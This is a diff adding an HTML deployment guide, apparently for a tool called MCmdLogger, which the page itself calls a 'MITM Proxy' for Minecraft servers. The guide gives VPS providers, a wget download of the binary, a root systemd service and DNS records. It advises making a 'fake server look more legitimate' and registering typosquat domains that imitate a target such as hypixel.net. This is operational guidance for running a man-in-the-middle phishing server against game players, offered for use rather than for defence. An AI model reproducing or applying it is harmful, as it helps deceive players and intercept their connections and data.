+                                    <p>Вы получите адрес типа: <code>random.joinmc.link</code></p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- VPS Deployment -->
+                <div class="deployment-section">
+                    <h2 data-i18n="deployment.vpsTitle">🖥️ VPS Deployment (24/7)</h2>
+                    <p data-i18n="deployment.vpsDesc">For running MCmdLogger continuously, you need a Virtual Private
+                        Server (VPS).</p>
+
+                    <!-- EN Providers -->
+                    <div class="provider-group" data-lang="en">
+                        <h4>🌍 International Providers</h4>
+                        <div class="provider-cards">
+                            <div class="provider-card">
+                                <h4>Hetzner</h4>
+                                <p class="price">€3.79/mo (~$4)</p>
+                                <p>Best value, EU/US</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://hetzner.com')">Visit</button>
+                            </div>
+                            <div class="provider-card">
+                                <h4>Contabo</h4>
+                                <p class="price">€4.99/mo (~$5)</p>
+                                <p>High resources</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://contabo.com')">Visit</button>
+                            </div>
+                            <div class="provider-card">
+                                <h4>DigitalOcean</h4>
+                                <p class="price">$4/month</p>
+                                <p>Easy to use</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://digitalocean.com')">Visit</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- RU Providers -->
+                    <div class="provider-group" data-lang="ru">
+                        <h4>🇷🇺 Россия (RUB)</h4>
+                        <div class="provider-cards">
+                            <div class="provider-card">
+                                <h4>FirstVDS</h4>
+                                <p class="price">от 219 ₽/мес</p>
+                                <p>1 vCPU, 2GB RAM</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://firstvds.ru')">Перейти</button>
+                            </div>
+                            <div class="provider-card">
+                                <h4>Timeweb</h4>
+                                <p class="price">от 350 ₽/мес</p>
+                                <p>1 vCPU, 1GB RAM</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://timeweb.com')">Перейти</button>
+                            </div>
+                            <div class="provider-card">
+                                <h4>REG.RU</h4>
+                                <p class="price">от 480 ₽/мес</p>
+                                <p>1 vCPU, 1GB RAM</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://reg.ru')">Перейти</button>
+                            </div>
+                        </div>
+
+                        <h4 style="margin-top: 24px;">🇰🇿 Казахстан (KZT)</h4>
+                        <div class="provider-cards">
+                            <div class="provider-card">
+                                <h4>PS.kz</h4>
+                                <p class="price">от 3120 ₸/мес</p>
+                                <p>VPS Basic</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://ps.kz')">Перейти</button>
+                            </div>
+                            <div class="provider-card">
+                                <h4>Hoster.kz</h4>
+                                <p class="price">от 4800 ₸/мес</p>
+                                <p>Cloud Server</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://hoster.kz')">Перейти</button>
+                            </div>
+                            <div class="provider-card">
+                                <h4>iHoster.kz</h4>
+                                <p class="price">от 2990 ₸/мес</p>
+                                <p>VPS Start</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://ihoster.kz')">Перейти</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <h3>Minimum Requirements</h3>
+                    <ul class="requirements-list">
+                        <li>🔲 1 vCPU</li>
+                        <li>💾 1 GB RAM</li>
+                        <li>📀 10 GB Storage</li>
+                        <li>🌐 Linux (Ubuntu/Debian recommended)</li>
+                    </ul>
+
+                    <h3>Installation on Linux</h3>
+                    <div class="code-block">
+                        <pre><code># Download MCmdLogger
+wget https://voxelhax.com/mcmdlogger/latest -O mcmdlogger
+chmod +x mcmdlogger
+
+# Install screen for background running
+apt install screen -y
+
+# Start MCmdLogger in screen
+screen -S mcmd
+./mcmdlogger
+# Press Ctrl+A, then D to detach
+
+# To reattach later:
+screen -r mcmd</code></pre>
+                    </div>
+
+                    <h3>Systemd Auto-Start Service</h3>
+                    <p>Create <code>/etc/systemd/system/mcmdlogger.service</code>:</p>
+                    <div class="code-block">
+                        <pre><code>[Unit]
+Description=MCmdLogger MITM Proxy
+After=network.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/root/mcmdlogger
+ExecStart=/root/mcmdlogger/mcmdlogger
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target</code></pre>
+                    </div>
+                    <div class="code-block">
+                        <pre><code># Enable and start the service
+systemctl enable mcmdlogger
+systemctl start mcmdlogger
+
+# Check status
+systemctl status mcmdlogger</code></pre>
+                    </div>
+                </div>
+
+                <!-- Custom Domain -->
+                <div class="deployment-section">
+                    <h2 data-i18n="deployment.domainTitle">🌍 Custom Domain Setup</h2>
+                    <p data-i18n="deployment.domainDesc">Make your fake server look more legitimate with a custom
+                        domain.</p>
+
+                    <h3 data-i18n="deployment.buyDomain">Step 1: Buy a Domain</h3>
+
+                    <!-- EN Registrars -->
+                    <div class="provider-group" data-lang="en">
+                        <p>Recommended registrars:</p>
+                        <div class="provider-cards">
+                            <div class="provider-card">
+                                <h4>Namecheap</h4>
+                                <p class="price">$8.88/year</p>
+                                <p>.com domains</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://namecheap.com')">Visit</button>
+                            </div>
+                            <div class="provider-card">
+                                <h4>Cloudflare</h4>
+                                <p class="price">$9.15/year</p>
+                                <p>Free DNS</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://cloudflare.com')">Visit</button>
+                            </div>
+                            <div class="provider-card">
+                                <h4>Porkbun</h4>
+                                <p class="price">$9.73/year</p>
+                                <p>Great prices</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://porkbun.com')">Visit</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- RU Registrars -->
+                    <div class="provider-group" data-lang="ru">
+                        <h4>🇷🇺 Домены .ru</h4>
+                        <div class="provider-cards">
+                            <div class="provider-card">
+                                <h4>REG.RU</h4>
+                                <p class="price">119 ₽ рег. / 959 ₽ год</p>
+                                <p>Популярный</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://reg.ru')">Перейти</button>
+                            </div>
+                            <div class="provider-card">
+                                <h4>Timeweb</h4>
+                                <p class="price">179 ₽ рег. / 399 ₽ год</p>
+                                <p>Дёшево</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://timeweb.com')">Перейти</button>
+                            </div>
+                            <div class="provider-card">
+                                <h4>RU-CENTER</h4>
+                                <p class="price">150 ₽ рег.</p>
+                                <p>Надёжный</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://nic.ru')">Перейти</button>
+                            </div>
+                        </div>
+
+                        <h4 style="margin-top: 24px;">🇰🇿 Домены .kz</h4>
+                        <div class="provider-cards">
+                            <div class="provider-card">
+                                <h4>PS.kz</h4>
+                                <p class="price">8820 ₸/год</p>
+                                <p>.kz, .com.kz</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://ps.kz')">Перейти</button>
+                            </div>
+                            <div class="provider-card">
+                                <h4>Hoster.kz</h4>
+                                <p class="price">8800 ₸/год</p>
+                                <p>.kz домены</p>
+                                <button class="btn btn-small btn-outline"
+                                    onclick="openExternal('https://hoster.kz')">Перейти</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <h3 data-i18n="deployment.subdomainTitle">Step 2: Setup Subdomain (play.server.net)</h3>
+                    <p data-i18n="deployment.subdomainDesc">To create a subdomain like <code>play.yourserver.com</code>,
+                        you need to configure DNS records:</p>
+
+                    <div class="code-block">
+                        <pre><code># Вариант 1: A запись + SRV (если у вас статический IP)
+Type: A
+Name: play (или mc)
+Value: YOUR_VPS_IP (например 123.45.67.89)
+
+Type: SRV
+Name: _minecraft._tcp.play
+Priority: 0
+Weight: 5
+Port: 25565
+Target: play.yourdomain.com
+
+# Вариант 2: CNAME + SRV (для ngrok/playit)
+Type: CNAME
+Name: play
+Value: 0.tcp.ngrok.io
+
+Type: SRV
+Name: _minecraft._tcp.play
+Priority: 0
+Weight: 5
+Port: 12345 (ваш ngrok порт)
+Target: play.yourdomain.com</code></pre>
+                    </div>
+
+                    <p data-i18n="deployment.afterSetup">After setup, players can connect using:
+                        <code>play.yourdomain.com</code>
+                    </p>
+
+                    <div class="tip-box">
+                        <h4>💡 Pro Tip</h4>
+                        <p data-i18n="deployment.proTip">Choose a domain similar to the target server. For example:</p>
+                        <ul>
+                            <li>Target: <code>hypixel.net</code></li>
+                            <li>Fake: <code>play.hypix3l.net</code>, <code>play.hypixel-mc.com</code>,
+                                <code>mc.hypixel-play.net</code>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <script src="renderer.js"></script>
+</body>
+
+</html>
